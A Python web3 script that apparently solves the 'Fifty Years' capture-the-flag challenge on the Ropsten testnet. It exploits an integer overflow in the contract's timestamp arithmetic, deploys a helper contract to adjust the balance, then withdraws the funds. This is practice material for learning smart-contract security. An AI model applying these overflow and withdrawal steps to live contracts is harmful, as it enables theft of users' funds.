from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CHALLENGE_CONTRACT_ADDRESS = "0xCF6F17CD0075061e6D41fbE8950f5F26FEFfa0a7"

with open('CTE_Contracts/FiftyYearsChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_challenge_code = compile_source(challenge_code, solc_version="0.4.21")
challenge_contract_id, challenge_contract_interface = compiled_challenge_code.popitem()
challenge_contract_abi = challenge_contract_interface["abi"]
challenge_contract = w3.eth.contract(address=CHALLENGE_CONTRACT_ADDRESS, abi=challenge_contract_abi)


time_one_day_till_overflow = 2**256 - (60*60*24)
tx = challenge_contract.functions.upsert(2, time_one_day_till_overflow).buildTransaction({
    "value": 1,
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

tx = challenge_contract.functions.upsert(3, 0).buildTransaction({
    "value": 2,
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

with open('ExploitContracts/RetirementFund.sol', 'r') as file:
    exploit_contract_code = file.read()

compiled_exploit_code = compile_source(exploit_contract_code, solc_version="0.7.3")
exploit_contract_code, exploit_contract_interface = compiled_exploit_code.popitem()
exploit_contract_abi = exploit_contract_interface["abi"]
exploit_contract_bytecode = exploit_contract_interface["bin"]

exploit_contract = w3.eth.contract(abi=exploit_contract_abi, bytecode=exploit_contract_bytecode)

construct_txn = exploit_contract.constructor(CHALLENGE_CONTRACT_ADDRESS).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "value": 2,
    "gas": 3000000,
    "gasPrice": w3.toWei('5', "gwei")
})
signed_tx = w3.eth.account.signTransaction(construct_txn, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)


tx = challenge_contract.functions.withdraw(2).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert challenge_contract.functions.isComplete().call()